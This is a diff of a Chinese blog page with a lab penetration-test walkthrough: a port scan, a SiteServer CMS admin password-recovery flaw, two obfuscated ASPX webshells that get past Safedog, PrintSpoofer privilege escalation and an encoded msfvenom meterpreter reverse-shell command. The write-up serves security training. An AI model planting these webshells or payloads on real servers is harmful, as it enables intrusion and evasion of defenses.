@@ -308,8 +308,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>web服务器  </p>
-<p>192.168.0.114 （本地使用nat） </p>
+        <h3 id="环境搭建">环境搭建</h3>
+<p>web服务器</p>
+<p>192.168.0.114 （本地使用nat）</p>
 <p>10.10.131(Vm18) 开启防火墙 安全狗 和windows自带杀软</p>
 <p>OA系统</p>
 <p>10.10.1.130（VM18）</p>
@@ -317,50 +318,62 @@
 <p>域控dc</p>
 <p>10.10.10.165（VM19） 无防护软件</p>
 <p><img src="/posts/ab4fb19a/tuopu.png"></p>
-<br>
-
+<p><br></p>
 <p>3台机器密码</p>
-<p>win2016-web     <code>!@#QWE123</code></p>
-<p>win2016-dc        <code>!@#QWE123.</code></p>
-<p>win2012 oa        <code>!@#Q123</code></p>
-<br>
-
+<p>win2016-web <code>!@#QWE123</code></p>
+<p>win2016-dc <code>!@#QWE123.</code></p>
+<p>win2012 oa <code>!@#Q123</code></p>
+<p><br></p>
 <p>目的 :获取域控中的flag.txt内容</p>
-<br>
-
-<p>先修改host文件 绑定ip和域名 192.168.0.144 <a target="_blank" rel="noopener" href="http://www.moonlab.com/">www.moonlab.com</a></p>
-<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>nmap扫一下端口</p>
-<p><code>sudo nmap -sV -p- 192.168.0.114</code> 开放了21 90 999 3389 5985 6588端口</p>
+<p><br></p>
+<p>先修改host文件 绑定ip和域名 192.168.0.144 www.moonlab.com</p>
+<h4 id="信息收集">信息收集</h4>
+<p>nmap扫一下端口</p>
+<p><code>sudo nmap -sV -p- 192.168.0.114</code> 开放了21 90 999 3389
+5985 6588端口</p>
 <blockquote>
-<p>kali@kali2020:~$ sudo nmap -sV -p- 192.168.0.114<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-06-16 10:55 CST<br>Nmap scan report for <a target="_blank" rel="noopener" href="http://www.moonlab.com/">www.moonlab.com</a> (192.168.0.114)<br>Host is up (0.00040s latency).<br>Not shown: 65529 filtered ports<br>PORT     STATE SERVICE       VERSION<br>21/tcp   open  ftp           Microsoft ftpd<br>80/tcp   open  http          Microsoft IIS httpd 10.0<br>999/tcp  open  http          Microsoft IIS httpd 10.0<br>3389/tcp open  ms-wbt-server Microsoft Terminal Services<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>6588/tcp open  http          Microsoft IIS httpd 10.0<br>MAC Address: 00:0C:29:36:38:42 (VMware)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 123.13 seconds</p>
+<p>kali@kali2020:~$ sudo nmap -sV -p- 192.168.0.114 [sudo] kali 的密码：
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 10:55 CST Nmap
+scan report for www.moonlab.com (192.168.0.114) Host is up (0.00040s
+latency). Not shown: 65529 filtered ports PORT STATE SERVICE VERSION
+21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft IIS httpd 10.0
+999/tcp open http Microsoft IIS httpd 10.0 3389/tcp open ms-wbt-server
+Microsoft Terminal Services 5985/tcp open http Microsoft HTTPAPI httpd
+2.0 (SSDP/UPnP) 6588/tcp open http Microsoft IIS httpd 10.0 MAC Address:
+00:0C:29:36:38:42 (VMware) Service Info: OS: Windows; CPE:
+cpe:/o:microsoft:windows</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 123.13 seconds</p>
 </blockquote>
 <p>看下robots.txt</p>
 <blockquote>
-<p>User-agent: *<br>Disallow: /SiteServer/<br>Disallow: /SiteFiles/<br>Disallow: /UserCenter/</p>
+<p>User-agent: * Disallow: /SiteServer/ Disallow: /SiteFiles/ Disallow:
+/UserCenter/</p>
 </blockquote>
-<p>访问<code>http://www.moonlab.com/siteserver</code>看到一个管理员登陆页面，使用的是siteserver cms</p>
-<p>系统版本：3.6.4 .NET 版本：2.0 数据库：SqlServer </p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>去网上查一下有没有相关漏洞。</p>
-<p>发现SiteServer cms存在管理员密码找回漏洞，只需要关闭js 然后输入admin 点击下一步即可得到管理员密码</p>
+<p>访问<code>http://www.moonlab.com/siteserver</code>看到一个管理员登陆页面，使用的是siteserver
+cms</p>
+<p>系统版本：3.6.4 .NET 版本：2.0 数据库：SqlServer</p>
+<h4 id="漏洞利用">漏洞利用</h4>
+<p>去网上查一下有没有相关漏洞。</p>
+<p>发现SiteServer cms存在管理员密码找回漏洞，只需要关闭js 然后输入admin
+点击下一步即可得到管理员密码</p>
 <p><img src="/posts/ab4fb19a/1.png"></p>
 <p><img src="/posts/ab4fb19a/2.png"></p>
 <p><img src="/posts/ab4fb19a/3.png"></p>
 <p>得到密码为 admin5566 成功登录到后台</p>
-<h4 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h4><p>考虑直接在站点文件管理处 上传一个aspx的一句话，但是被安全狗拦截了</p>
-<p>看到有.aspx的文件 直接进行编辑修改,然后尝试连接一句话，密码为 1  ，成功使用蚁剑连接</p>
+<h4 id="上传webshell">上传webshell</h4>
+<p>考虑直接在站点文件管理处 上传一个aspx的一句话，但是被安全狗拦截了</p>
+<p>看到有.aspx的文件 直接进行编辑修改,然后尝试连接一句话，密码为 1
+，成功使用蚁剑连接</p>
 <p><img src="/posts/ab4fb19a/ant4.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var SE=Request.Form[&quot;1&quot;];</span><br><span class="line">var SMQ=&quot;unsa&quot;,FWJVPDC=&quot;fe&quot;,PZEGHR=SMQ+FWJVPDC;</span><br><span class="line">function AJHB()</span><br><span class="line">&#123;</span><br><span class="line">return SE;</span><br><span class="line">&#125;</span><br><span class="line">function NCBRJ()</span><br><span class="line">&#123;</span><br><span class="line">    eval(AJHB(),PZEGHR);</span><br><span class="line">&#125;</span><br><span class="line">NCBRJ()</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<br>
-
+<p><br></p>
 <p>也可以在模块管理处上传,在网上找了个aspx一句话免杀，密码为M</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;% var p = Request.Item[&quot;M&quot;]; var a = p.substring(0,1); var b = p.substring(1,99999); var c = &quot;un&quot; + Char ( 115 ) + Char ( 97 ) + &quot;fe&quot;; eval(a+b,c);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过站点文件管理 可以找到一句话上传的路径 为 根目录\SiteFiles\SiteTemplates\1\ </p>
+<p>通过站点文件管理 可以找到一句话上传的路径 为 根目录\1 </p>
 <p><img src="/posts/ab4fb19a/4.png"></p>
-<br>
-
+<p><br></p>
 <p>使用蚁剑连接</p>
 <p><img src="/posts/ab4fb19a/ant1.png"></p>
 <p>whoami 显示为 <code>iis apppool\moonlab</code></p>
@@ -369,23 +382,22 @@
 <p>netstat -ano 查看本机开放端口</p>
 <p>net start 查看已经启动的windows服务</p>
 <blockquote>
-<p>   Safedog Guard Center<br>   Safedog Update Center<br>   SafeDogCloudHelper</p>
+<p>Safedog Guard Center Safedog Update Center SafeDogCloudHelper</p>
 </blockquote>
 <p><img src="/posts/ab4fb19a/ant3.png"></p>
-<br>
-
-<h4 id="利用PrintSpoofer-提权"><a href="#利用PrintSpoofer-提权" class="headerlink" title="利用PrintSpoofer 提权"></a>利用PrintSpoofer 提权</h4><p>将 PrintSpoofer.exe 上传到 windows/Temp 中</p>
+<p><br></p>
+<h4 id="利用printspoofer-提权">利用PrintSpoofer 提权</h4>
+<p>将 PrintSpoofer.exe 上传到 windows/Temp 中</p>
 <p>PrintSpoofer64.exe -h 查看帮助</p>
 <p>![PrintSpoofer1.PNG]</p>
-<p>PrintSpoofer64.exe -i -c “whoami”</p>
+<p>PrintSpoofer64.exe -i -c "whoami"</p>
 <p><img src="/posts/ab4fb19a/PrintSpoofer2.png"></p>
 <p>成功执行 system权限</p>
-<br>
-
+<p><br></p>
 <hr>
-<p>后续还未完成…..</p>
-<h4 id="msf生成payload"><a href="#msf生成payload" class="headerlink" title="msf生成payload"></a>msf生成payload</h4><br>
-
+<p>后续还未完成.....</p>
+<h4 id="msf生成payload">msf生成payload</h4>
+<p><br></p>
 <p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.128  LPORT=2333 -e x86/shikata_ga_nai  -i 20 -f csharp -o 1.txt</code></p>
 
     </div>
@@ -516,7 +528,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0webshell"><span class="nav-number">1.3.</span> <span class="nav-text">上传webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8PrintSpoofer-%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">利用PrintSpoofer 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90payload"><span class="nav-number">1.5.</span> <span class="nav-text">msf生成payload</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0webshell"><span class="nav-number">1.3.</span> <span class="nav-text">上传webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8printspoofer-%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">利用PrintSpoofer 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E7%94%9F%E6%88%90payload"><span class="nav-number">1.5.</span> <span class="nav-text">msf生成payload</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -532,7 +544,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -580,7 +592,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -594,7 +606,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -605,7 +617,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -745,6 +757,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
